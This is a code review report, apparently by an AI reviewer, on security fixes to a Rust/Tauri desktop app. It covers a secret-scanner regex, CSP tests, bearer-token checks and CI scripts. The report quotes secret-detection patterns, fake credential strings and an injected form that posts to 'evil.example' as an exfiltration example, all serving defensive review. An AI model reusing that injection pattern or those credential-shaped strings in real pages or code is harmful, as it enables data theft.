---
phase: 01-foundation-skeleton
reviewed: 2026-07-29T05:57:42Z
depth: standard
scope: gap-closure plans 01-10 .. 01-13 (diff base c231656)
files_reviewed: 17
files_reviewed_list:
  - .github/workflows/ci.yml
  - crates/prism-engine/tests/facade.rs
  - crates/prism-mcp/src/deps.rs
  - crates/prism-mcp/src/lib.rs
  - crates/prism-mcp/src/middleware.rs
  - crates/prism-mcp/tests/middleware_gate.rs
  - crates/prism-mcp/tests/trait_injection.rs
  - crates/prism-store/src/settings.rs
  - scripts/check-deps.sh
  - scripts/check-secrets.sh
  - src-tauri/Cargo.toml
  - src-tauri/src/lib.rs
  - src-tauri/tauri.conf.json
  - src/lib/ipc.ts
  - src/lib/tauri-security.test.ts
  - src/pages/Settings.test.tsx
  - src/pages/Settings.tsx
findings:
  critical: 1
  warning: 11
  info: 4
  total: 16
status: issues_found
---

# Phase 01 (gap closure): Code Review Report

**Reviewed:** 2026-07-29T05:57:42Z
**Depth:** standard
**Files Reviewed:** 17
**Status:** issues_found

## Summary

This is a re-review scoped to the four gap-closure plans (01-10 credential-bearing `base_url`, 01-11 secret-scanner blindness, 01-12 MCP bearer fail-closed, 01-13 WebView CSP + tracing subscriber), diffed against `c231656`. It replaces the earlier report at `4af393b`.

**Prior findings CR-02 and CR-03 are confirmed closed, with caveats:**

- **CR-02 (missing CSP / open asset protocol) — closed at the config level, but its guard is weak.** `tauri.conf.json` now carries a real production CSP, a separate `devCsp`, and `assetProtocol.enable: false` with an empty scope; the matching `protocol-asset` cargo feature was removed from `src-tauri/Cargo.toml`, so both halves are genuinely closed. However the regression test meant to keep it that way (`src/lib/tauri-security.test.ts`) does not detect the three most likely weakenings — see **WR-01**. The CSP is also missing `form-action`, which has no `default-src` fallback — see **WR-02**.
- **CR-03 (empty-bearer fail-open) — genuinely closed, in two independent layers.** `McpDeps::new` is now fallible and rejects empty/whitespace bearers; `constant_time_eq` independently returns `false` for an empty `expected`; both layers carry their own tests, and the previously fail-open assertion `constant_time_eq("", "")` was *reversed* rather than deleted. The comparison layer left unreachable code behind (**WR-05**) and the constructor's trim-check/store-untrimmed asymmetry is a new latent problem (**WR-06**), but the fail-open itself is gone.

The single BLOCKER is not in product code — it is in the automated evidence. `scripts/check-secrets.sh` was widened for Anthropic-shaped keys, but its keyword branch still requires a **quoted** value, so the entire class of unquoted assignments (`.env`, YAML, TOML, shell, CI `env:` blocks) remains invisible. The selftest masks this: its only unquoted positive sample happens to match through the `sk-` branch instead. I verified nothing is currently hiding in that hole, so this is an evidence-soundness failure rather than a live leak — but success criterion 4's automated proof does not hold as written.

The recurring pattern across this batch is **correct guards protected by non-discriminating tests**: WR-01, WR-03 and WR-04 are all cases where the shipped code is right but the assertion would stay green through the exact regression it exists to catch.

All 34 frontend tests pass; `cargo test -p prism-mcp -p prism-store` is green; `check-deps.sh all` and `check-secrets.sh all` both exit 0. Nothing below is a currently-failing test.

## Critical Issues

### CR-01: `check-secrets.sh` keyword branch requires a quoted value — every unquoted assignment is invisible, and the selftest hides it

**Classification:** BLOCKER
**File:** `scripts/check-secrets.sh:52` (pattern), `scripts/check-secrets.sh:89-109` (selftest positives)

**Issue:**

The keyword alternation is

```
(api[_-]?key|secret|token|password)[[:space:]]*[=:][[:space:]]*["'][^"']{8,}
```

The `["']` is mandatory. Any assignment whose value is **not quoted** cannot match this branch. That is the dominant form in exactly the file types the success criterion calls "配置": `.env`, YAML, TOML, `justfile`, shell scripts, GitHub Actions `env:` blocks.

Verified against the live pattern (extracted verbatim from line 52):

```
MISSED : ANTHROPIC_API_KEY=abcdefghijklmnopqrstuvwx
MISSED : password=hunter2hunter2hunter
MISSED : AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
MISSED : mcp_bearer_token: 0123456789abcdef0123456789abcdef
MISSED : github_pat_11ABCDEFG0abcdefghijklmnopqrstuvwxyz1234567890
MISSED : xoxb-123456789012-1234567890123-abcdefghijklmnopqrstuvwx
MISSED : AIzaSyA-abcdefghijklmnopqrstuvwxyz12345
CAUGHT :   bearerToken = "0123456789abcdef0123456789abcdef"
```

Note the fourth line: `mcp_bearer_token: <32 hex>` is **this project's own second secret** (`docs/keychain-naming.md`; injected into `McpDeps` in Phase 6), in YAML/TOML form, and the scanner cannot see it.

The selftest is what makes this dangerous rather than merely incomplete. Positive sample 3 (line 92) is

```bash
positive+=("ANTHROPIC_API_KEY=${sk}${dash}ant-api03-xyz0123456789abcdefghij")
```

— an unquoted env-style assignment. It passes, which *reads* as "unquoted assignments are covered." It is not: it matches through the `sk-[A-Za-z0-9_-]{20,}` branch. Strip the `sk-` prefix from that sample and it stops matching entirely. No sample anywhere in the selftest isolates the keyword branch against an unquoted value, so the file's own stated design goal ("正则的判别力从此是每次 CI 都重新证明一遍的断言") is not met for the branch that was just extended.

This is the same failure shape the file's header documents as its reason for existing: the scanner is blind to a real supplier format, and nothing goes red.

I confirmed with a broader sweep (`git grep -niE '(api[_-]?key|secret|token|password|bearer)[[:space:]]*[=:][[:space:]]*[A-Za-z0-9_./+-]{12,}'` plus a ≥32-char base64/hex literal sweep) that **nothing is currently hiding in this hole** — the only hits are the intended `IN_QUERY` fixture and `Cargo.lock` checksums. So this is an evidence failure, not an active leak. But SC-4's automated proof does not establish what it claims.

Secondary gaps in the same pattern, worth folding into one fix: `github_pat_` (fine-grained GitHub PATs), `xox[baprs]-` (Slack), `AIza` (Google) are all uncovered.

**Fix:**

Make the quote optional, add an unquoted value class, then add selftest samples that isolate the branch:

```bash
# 值可以带引号，也可以是裸值（.env / YAML / TOML / CI env: 的常态）
UNQUOTED="[A-Za-z0-9_./+~-]{16,}"
PATTERN="sk-[A-Za-z0-9_-]{20,}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|AKIA[A-Z0-9]{16}|xox[baprs]-[A-Za-z0-9-]{16,}|AIza[A-Za-z0-9_-]{30,}|(api[_-]?key|secret|token|password)[[:space:]]*[=:][[:space:]]*(${QUOTE}${NOT_QUOTE}{8,}|${UNQUOTED})"
```

And, critically, positives that cannot match through any prefix branch:

```bash
# 必须由关键词分支命中：值里没有任何供应商前缀。
# 删掉「引号可选」这半个改动 → 这两条立刻变红，而旧的 5 条取样不会。
positive+=("MCP_BEARER_TOKEN=0123456789abcdef0123456789abcdef")
positive+=("password: hunter2hunter2hunter2")
```

Then re-run `scan` and adjust any fixture that newly trips it — per the file's own one-way rule, change the fixture, never the pattern. Expect `crates/prism-store/src/settings.rs:246` (`IN_QUERY`'s `?api-key=prism-test-secret-value`) and its mirror at `scripts/check-secrets.sh:117` to need renaming, e.g. to a non-keyword query parameter name.

## Warnings

### WR-01: The CSP regression test passes through `'unsafe-inline'`, an explicit remote script origin, and `connect-src *`

**Classification:** WARNING
**File:** `src/lib/tauri-security.test.ts:47-59`

**Issue:** The test's stated purpose (lines 44-46) is to upgrade assertion ② "from 字面量在 to 面没被扩宽". It does not. The loop at 49-55 is a four-entry denylist (`*`, `http:`, `https:`, `data:`, `*.`-prefixed). Verified by replaying the exact assertion logic against weakened policies:

```
PASSES TEST | default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'
PASSES TEST | default-src 'self'; script-src 'self' https://cdn.evil.example; object-src 'none'; base-uri 'self'
PASSES TEST | default-src 'self'; script-src 'self'; connect-src *; object-src 'none'
```

All three green. `script-src 'self' 'unsafe-inline'` is the single most probable regression — it is what gets added when a CSP violation blocks something — and it fully reinstates the XSS path this test exists to close (Phase 3+ renders agent-authored Markdown). `connect-src *` is an unconstrained exfiltration channel and is not checked at all. The file's own argument ("一个把 `csp` 改回 `null` 的 diff 是一次代码评审最容易放过的形状") applies verbatim to a one-word `'unsafe-inline'` diff, which this test would wave through.

**Fix:** Assert the allowlist, not a denylist, and cover the other load-bearing directives:

```ts
// script-src 必须恰好是 'self' —— 任何新增来源都要在这条断言上过一次评审
expect(directiveSources(csp, "script-src")).toEqual(["'self'"]);
expect(csp).not.toContain("unsafe-eval");
expect(csp).not.toContain("unsafe-inline"); // 发布形态一个都不许；放宽只允许发生在 devCsp
expect(directiveSources(csp, "connect-src")).toEqual([
  "'self'", "ipc:", "http://ipc.localhost",
]);
expect(directiveSources(csp, "object-src")).toEqual(["'none'"]);
expect(directiveSources(csp, "base-uri")).toEqual(["'self'"]);
```

### WR-02: Production CSP is missing `form-action`, which does not inherit from `default-src`

**Classification:** WARNING
**File:** `src-tauri/tauri.conf.json:21` (and `:22` for `devCsp`)

**Issue:** `form-action` is one of the CSP directives with **no `default-src` fallback**. Under the current policy, an injected `<form action="https://evil.example" method="POST">` plus auto-submit is a working exfiltration channel even though `connect-src`, `img-src`, and `script-src` are all pinned to `'self'`. The threat this CSP was written for (Phase 3+ rendering Markdown authored by an external coding agent; Phase 6 putting an LLM in the loop) is precisely a content-injection threat, so closing the script and network paths while leaving the form path open is an incomplete boundary.

**Fix:** Add to both `csp` and `devCsp`:

```
… object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'
```

and pin both in `tauri-security.test.ts` alongside the WR-01 assertions.

### WR-03: The undifferentiated-403 contract (T-01-29) is never asserted against the router that ships, and the SDK layer beneath it violates it

**Classification:** WARNING
**File:** `crates/prism-mcp/tests/middleware_gate.rs:192-204, 425-449`; `crates/prism-mcp/src/server.rs:56-59`

**Issue:** Two gaps that compound.

1. `rejections_do_not_disclose_which_layer_denied` (line 425) runs against three **isolated sentinel routers**, never against `serve_loopback`. The A-group tests that do hit the real router assert only `is_client_error()` for the bearer cases (lines 192-204) — a regression to 401, 400, or 404 stays green, which is exactly the status-code differentiation T-01-29 forbids.

2. `build_router` deliberately configures the rmcp SDK with the same allowlists (`with_allowed_hosts` / `with_allowed_origins`) for defense in depth. The SDK's rejections are **not** undifferentiated. From `rmcp-2.2.0/src/transport/streamable_http_server/tower.rs`:

   - `forbidden_response("Forbidden: Host header is not allowed")` — 403 **with a body naming the layer**
   - `forbidden_response("Forbidden: Origin header is not allowed")` — 403 with a distinguishing body
   - `bad_request_response("Bad Request: Invalid Host header")` — **400**, with a body
   - `bad_request_response("Bad Request: Invalid Origin header")` — **400**, with a body

   These are reachable because the two layers parse differently: the app's `host_of` (`middleware.rs:42-61`) accepts anything before the first `:`, while the SDK uses the stricter `http::uri::Authority::try_from`. `Host: 127.0.0.1:notanumber` passes layer ① and draws a 400-with-body from the SDK.

Reachability requires a valid bearer, so this is not an unauthenticated oracle — hence WARNING, not BLOCKER. But the documented property ("三层一律返回 403 且空正文") is false end-to-end, and no test would notice if it became false pre-authentication too.

**Fix:** (a) tighten the A-group bearer assertions from `is_client_error()` to `assert_eq!(status, StatusCode::FORBIDDEN)` plus an empty-body check; (b) add one test that drives `serve_loopback` with a bad Host, a bad Origin, and a bad bearer and asserts the three responses are byte-identical; (c) either align `host_of` with `Authority::try_from` so the two layers agree, or amend the T-01-29 note in `middleware.rs:6-11` to state explicitly that the contract covers only the pre-authentication surface.

### WR-04: `check_dup` reports OK and exits 0 when `cargo tree` fails

**Classification:** WARNING
**File:** `scripts/check-deps.sh:36`

**Issue:** `out=$(cargo tree --workspace --duplicates --edges normal || true)` swallows a non-zero exit; `out` is then empty, `grep` finds nothing, and the function prints `OK: no duplicate rusqlite/reqwest/libsqlite3-sys` and returns 0. Verified with a stub `cargo` on `PATH`:

```
$ PATH=$stub:$PATH bash scripts/check-deps.sh dup
error: failed to parse manifest
OK: no duplicate rusqlite/reqwest/libsqlite3-sys
exit=0
```

`check-secrets.sh:68-69` names this exact defect ("WR-11") in order to contrast it with its own load-bearing `|| true`, so it is a known, still-live fail-open in the evidence. In `all` mode a later check happens to abort the run, but a failure specific to `--duplicates` (a renamed flag in a future cargo, say) would silently retire the duplicate-SQLite assertion while still printing OK.

**Fix:** Distinguish "command failed" from "no output":

```bash
check_dup() {
  local out rc=0
  out=$(cargo tree --workspace --duplicates --edges normal) || rc=$?
  if [ "$rc" -ne 0 ]; then
    echo "FAIL: cargo tree --duplicates could not run (exit $rc)" >&2
    return 1
  fi
  if grep -Eq '^(rusqlite|reqwest|libsqlite3-sys) v' <<<"$out"; then
    …
  fi
}
```

### WR-05: Unreachable branches and a misleading comment inside `constant_time_eq`

**Classification:** WARNING
**File:** `crates/prism-mcp/src/middleware.rs:150-173`

**Issue:** After the early `if expected.is_empty() { return false; }` at line 151:

- line 158's `expected.len().max(1)` can never take the `1` arm;
- lines 163-168 are entirely dead — the comment "空 expected 时 folded 是长度 1 的哨兵，下面的 ct_eq 会与长度断言一起失败" describes a state the function cannot be in, and `padded` is unconditionally `&folded[..]`.

In a function whose entire value is that a reader can verify it by inspection, dead code documenting a non-existent second empty-handling path is an active hazard: the next reader may delete the line-151 guard believing lines 163-168 cover the case. They do not — with line 151 removed, `expected.ct_eq(&folded[..0])` on two empty slices returns *true* and `same_len` also holds, so the empty-configured gate fails open again. That is the CR-03 regression, one deletion away, with a comment inviting it.

(The XOR fold is also redundant given `same_len` is ANDed in at line 172, but that is defensible belt-and-braces; the dead branches are not.)

**Fix:**

```rust
fn constant_time_eq(expected: &str, presented: &str) -> bool {
    // CR-03 纵深第二层：配置为空的门禁不放行任何人。
    // 这是本函数**唯一**的空值处理点——下面没有第二道，删掉这一行就是 fail-open。
    if expected.is_empty() {
        return false;
    }
    let expected = expected.as_bytes();
    let presented = presented.as_bytes();

    let mut folded = vec![0u8; expected.len()];
    for (i, byte) in presented.iter().enumerate() {
        folded[i % expected.len()] ^= byte;
    }

    let same_len = (expected.len() as u64).ct_eq(&(presented.len() as u64));
    let same_bytes = expected.ct_eq(&folded);
    (same_len & same_bytes).into()
}
```

`the_comparison_is_not_a_plain_equality` (line 234) should gain a third assertion: `assert!(body.contains("expected.is_empty()"), "空配置的短路守卫被删掉了")`.

### WR-06: `McpDeps::new` validates on `trim()` but stores the untrimmed value — a whitespace-padded bearer builds a gate nobody can open

**Classification:** WARNING
**File:** `crates/prism-mcp/src/deps.rs:51-59`

**Issue:** The guard is `bearer.trim().is_empty()`, but the value stored is the original `bearer`. So `McpDeps::new(.., "0123abcd\n")` succeeds. `require_bearer` then compares `deps.expose_bearer()` (`"0123abcd\n"`) against `raw.strip_prefix("Bearer ")` — and HTTP header parsing strips trailing OWS from the presented value, so the presented token can never carry that newline. **Every** request is denied, with the same undifferentiated 403 as a forged token.

This is exactly the path the doc comment at lines 39-42 anticipates: Phase 6 reads the token from the keychain. Keychain round-trips, file-backed fallbacks, and `Command` output all routinely carry a trailing `\n`. The failure is silent and fail-closed, and the only diagnostic is `warn!("bearer token mismatch")` — indistinguishable from an attacker. This will be expensive to diagnose in Phase 6.

**Fix:** Normalize once, at the place that already calls `trim`:

```rust
pub fn new(
    feedback: Arc<dyn FeedbackSource>,
    comments: Arc<dyn CommentSink>,
    bearer: impl Into<Arc<str>>,
) -> Result<Self, McpError> {
    // trim 一次并**存 trim 后的值**：只用 trim 判空、却存原值，会造出一个
    // 「构造成功但永远比不中」的门禁（钥匙串读出的 token 常带尾随换行）。
    let bearer: Arc<str> = Arc::from(bearer.into().trim());
    if bearer.is_empty() {
        return Err(McpError::EmptyBearer);
    }
    Ok(Self { feedback, comments, bearer })
}
```

Extend `an_empty_bearer_is_refused_at_construction` with
`assert_eq!(McpDeps::new(.., " tok ").unwrap().expose_bearer(), "tok");`.

### WR-07: `require_bearer` matches the auth scheme case-sensitively, contrary to RFC 7235

**Classification:** WARNING
**File:** `crates/prism-mcp/src/middleware.rs:129`

**Issue:** `raw.strip_prefix("Bearer ")` is byte-exact. RFC 7235 §2.1 defines `auth-scheme` as a case-insensitive token, and RFC 6750 clients legitimately send `bearer <token>` or `BEARER <token>`. Such a client is denied with an opaque 403 and a `warn!("Authorization scheme is not Bearer")` that never reaches it. The same line also rejects `Bearer  <token>` (RFC 7235 permits `1*SP` between scheme and credentials).

Given the deliberate no-diagnostics design, a spec-compliant MCP client that lowercases the scheme is indistinguishable from an attack — in an integration (Phase 6, Claude Code and other agents) where the client is not under this project's control.

**Fix:**

```rust
let Some((scheme, presented)) = raw.split_once(' ') else {
    return deny("Authorization header carries no credentials");
};
if !scheme.eq_ignore_ascii_case("bearer") {
    return deny("Authorization scheme is not Bearer");
}
let presented = presented.trim_start();
if !constant_time_eq(deps.expose_bearer(), presented) {
    return deny("bearer token mismatch");
}
```

Add a row to `bearer_layer_alone_is_what_rejects_a_bad_token`'s table asserting `bearer <GOOD_BEARER>` is **accepted** (a negative control — without it, "fix by accepting everything" also passes).

### WR-08: `errorCopy` reads through `Object.prototype` — some inputs return a function, not a string

**Classification:** WARNING
**File:** `src/lib/ipc.ts:41-70`

**Issue:** `ERROR_COPY` is an object literal, so `ERROR_COPY[code]` resolves inherited members, and `??` substitutes the fallback only for `null`/`undefined`. Verified:

```
toString         function  function toString() { [native code] }
constructor      function  function Object() { [native code] }
valueOf          function  function valueOf() { [native code] }
hasOwnProperty   function  function hasOwnProperty() { [native code] }
__proto__        object    [object Object]
nope             string    fallback     <- the intended behaviour
```

`errorCopy` declares `: string`; for those inputs it returns something else. The value flows straight into `setKeyNotice({ text })` / `setUrlNotice({ text })` and is rendered as `{notice.text}` in `NoticeLine` (`Settings.tsx:190`), where React throws on a function child — the Settings page unmounts to blank instead of showing an error line.

Today's Rust command errors are a fixed short-code set, so this is latent rather than live. But the function's documented contract (lines 66-69) is "unknown ⇒ generic fallback, never render raw content", and that contract is violated for a small set of inputs. `Record<string, string>` provides no compile-time protection here.

**Fix:**

```ts
const ERROR_COPY: Record<string, string> = Object.assign(Object.create(null), {
  invalid_url: "…",
  // …
});
```

or, keeping the literal:

```ts
export function errorCopy(err: unknown): string {
  const code = typeof err === "string" ? err : "";
  return Object.prototype.hasOwnProperty.call(ERROR_COPY, code)
    ? ERROR_COPY[code]
    : "操作失败，请重试。";
}
```

Add a test: `expect(errorCopy("toString")).toBe("操作失败，请重试。")`.

### WR-09: `check-secrets.sh scan` silently narrows to the current directory subtree and still reports OK

**Classification:** WARNING
**File:** `scripts/check-secrets.sh:72`

**Issue:** `git grep` searches from the current working directory downward by default, and the exclude pathspec `':(exclude).planning/'` is likewise cwd-relative. The script never `cd`s to the repository root. Verified:

```
$ cd src && bash ../scripts/check-secrets.sh scan
OK: no plaintext secret in version-controlled files
exit=0
```

From the repo root `git grep` sees 97 files; from `src/` it sees 14. The narrowed run is indistinguishable from a clean full run — same message, same exit code. CI happens to invoke it from the root, so this is not a live CI hole, but a developer running it directly, a future pre-commit hook, or `just` invoked from a subdirectory gets a clean bill of health covering 14% of the tree. This is the same failure class the file exists to close: a check that cannot see its target still exits 0.

(`check-deps.sh` does not share this problem — cargo resolves the workspace root regardless of cwd.)

**Fix:** Pin the working directory at the top of the script:

```bash
cd "$(git rev-parse --show-toplevel)"
```

and consider a floor assertion inside `scan` (abort if the scanned-file count is implausibly small) so a future scoping bug goes red rather than green.

### WR-10: `RUST_LOG` can raise every target to `trace`, undoing the deliberate restraint about log surface — and rmcp dumps whole MCP messages at that level

**Classification:** WARNING
**File:** `src-tauri/src/lib.rs:34, 43-51`

**Issue:** `DEFAULT_LOG_FILTER = "info"` and the comment at lines 32-33 justify *not* opening `debug` for `prism_mcp` on the grounds that the log sink is itself a new exfiltration surface (T-01-58). Line 44 then hands unbounded control of that surface to an environment variable: `EnvFilter::try_from_default_env()` accepts `RUST_LOG=trace` and applies it to every target, with no ceiling.

This is concrete, not theoretical. `rmcp-2.2.0/src/transport/streamable_http_server/tower.rs:1268,1288` contains `tracing::trace!(?message)` — full MCP message dumps. From Phase 5 onward those messages carry comment bodies and document excerpts, which is exactly what `prism_engine::services::record_receipt` goes out of its way not to log (T-01-33). One exported env var, or one leftover `RUST_LOG` in a developer's shell profile, reinstates it.

(I checked: hyper's `tracing` feature is *not* enabled in this dependency tree, so there is no Authorization-header dump path today. The rmcp message dump is the live one.)

**Fix:** Cap the env-supplied filter rather than accepting it wholesale — apply `.with_max_level(tracing::Level::DEBUG)` on the subscriber, or parse `RUST_LOG` and fall back to `DEFAULT_LOG_FILTER` with a `warn!` when it exceeds a project ceiling. At minimum, append a non-overridable `rmcp=info` directive to whatever filter is built.

### WR-11: The frontend URL pre-check is case-sensitive and rejects input the engine accepts

**Classification:** WARNING
**File:** `src/pages/Settings.tsx:25-27`

**Issue:** `!trimmed.startsWith("http://") && !trimmed.startsWith("https://")` is byte-exact, but URL schemes are case-insensitive and the `url` crate lowercases them — `validate_base_url("HTTPS://api.example.com/v1")` returns `Ok`. So `HTTPS://api.example.com/v1` is rejected locally with "链接必须以 http:// 或 https:// 开头", a message that directly contradicts what the user typed. On macOS an input without `autoCapitalize` set is a realistic source of a capitalized first character.

The comment at lines 20-22 states the invariant as "「前端放过但 engine 拒绝」不会在正常输入上出现"; the reverse divergence is real and produces the more confusing outcome, because the copy asserts something the input already satisfies.

**Fix:** Parse first, then test the parsed scheme — which also removes the duplicated scheme knowledge:

```ts
function localUrlIssue(raw: string): "invalid_url" | "invalid_url_credentials" | null {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return "invalid_url";
  }
  // `URL.protocol` 已经小写化，与 engine 侧 url crate 的口径一致
  if (url.protocol !== "http:" && url.protocol !== "https:") return "invalid_url";
  if (url.hostname === "") return "invalid_url";
  if (url.username !== "" || url.password !== "") return "invalid_url_credentials";
  if (url.search !== "" || url.hash !== "") return "invalid_url_credentials";
  return null;
}
```

## Info

### IN-01: API key is emptiness-checked on `trim()` but stored untrimmed

**Classification:** WARNING (low severity)
**File:** `src/pages/Settings.tsx:90-94`; propagates through `crates/prism-llm/src/secrets.rs:44`, which also does not trim

**Issue:** `submitKey` guards with `secretDraft.trim() === ""` but calls `saveKey.mutate(secretDraft)` — the raw value. A key pasted with a trailing newline or space (the normal result of copying from a provider console) is stored verbatim in the keychain. `api_key_status()` then reports `已配置`, the UI says everything is fine, and every Phase 4 LLM call returns 401 with no local signal pointing at whitespace. Same asymmetry as WR-06, in the other secret path.

**Fix:** `saveKey.mutate(secretDraft.trim())` in `Settings.tsx`, and defensively `set_password(secret.trim())` in `prism-llm`. Add an assertion to `Settings.test.tsx` that a key typed as `` `${FAKE_KEY}\n` `` reaches `setApiKey` as `FAKE_KEY`.

### IN-02: `tracing_init_installs_a_global_subscriber_and_is_idempotent` depends on being the only test in its binary that touches tracing

**Classification:** WARNING (low severity)
**File:** `src-tauri/src/lib.rs:104-120`

**Issue:** Line 106 asserts the *first* `init_tracing()` returns `true`, against a process-global dispatcher, in a test binary cargo runs multi-threaded. It holds today only because no other test in `prismdocs-shell`'s unit-test binary (`commands.rs:140`, `bus_adapter.rs:72`, `smoke.rs:53` all have `mod tests`) installs a subscriber. The moment one does — a natural thing to add when asserting on log output — this test flakes non-deterministically, and its failure message ("the first init_tracing() should install") points at the wrong code.

The doc comment already reasons carefully about not putting process-global preconditions into a discriminating test; the same reasoning applies to assertion ① itself.

**Fix:** Mark it `#[serial]` (`serial_test` is already a workspace dev-dependency, used in `crates/prism-engine/tests/facade.rs`), or drop assertion ① and keep only ② (`has_been_set()`) and ③ (idempotence), which carry the discriminating power without depending on call order.

### IN-03: CI coverage step scope contradicts the job's own comments

**Classification:** WARNING (low severity)
**File:** `.github/workflows/ci.yml:39-58`

**Issue:** Clippy (line 40) and test (line 43) use an explicit eight-crate "engine selection set", and the comment at lines 65-66 explains that `prismdocs-shell` needs a separate job because its tests require `--features test`. The coverage step at line 50 then runs `cargo llvm-cov --no-report --workspace`, which builds and runs `prismdocs-shell` **without** `--features test` — so its `#![cfg(feature = "test")]` IPC tests compile to zero tests, exactly the failure mode lines 65-66 warn about — and publishes the result under the heading `### Engine coverage` (line 54).

The reported number therefore mixes in shell code exercised by an incomplete test set, mislabelled as engine coverage. Since Phase 2 is stated to convert this figure into a hard gate, the baseline being measured is not the one being labelled.

**Fix:** Either narrow the coverage run to the same eight crates (`cargo llvm-cov --no-report -p prism-types -p prism-store …`) or keep `--workspace` and add `--features prismdocs-shell/test`, and relabel the summary heading accordingly.

### IN-04: Minor script and config inconsistencies

**Classification:** WARNING (low severity)

- **`scripts/check-deps.sh:66, 115, 154`** — `grep -q '^prism-engine'` and `grep -oE '^prism-[a-z]+'` both prefix-match. A future `prism-engine-core` would satisfy the no-cycle check while genuinely being a cycle, and a `prism-mcp2` would be truncated to `prism-mcp` in the offenders set. *Fix:* anchor on the version field — `grep -q '^prism-engine v'`, and `grep -oE '^prism-[a-z0-9-]+ '` with the trailing space, stripped afterwards.
- **`tsconfig.json`** declares `"types": ["vite/client", "vitest/globals"]` while `vite.config.ts` does not set `test.globals: true`, and `src/pages/Settings.test.tsx:41-43` explicitly notes globals are off and registers `afterEach(cleanup)` by hand. The `vitest/globals` entry is dead configuration that advertises the opposite of the real setup. *Fix:* drop `"vitest/globals"`.
- **`.github/workflows/ci.yml:6`** — `on: [push, pull_request]` double-runs every same-repo PR, and there is no `concurrency:` group or `permissions:` block. *Fix:* add `permissions: { contents: read }` and `concurrency: { group: "${{ github.workflow }}-${{ github.ref }}", cancel-in-progress: true }`.
- **`.github/workflows/ci.yml:29`** — the `engine` job's `restore-keys: ${{ runner.os }}-cargo-` is a prefix of the `shell` job's key `${{ runner.os }}-cargo-shell-…`, so the engine job can restore the shell job's `target/`. Harmless today, but the two jobs compile different feature sets. *Fix:* rename the engine key to `${{ runner.os }}-cargo-engine-…` with a matching restore-key.

---

_Reviewed: 2026-07-29T05:57:42Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
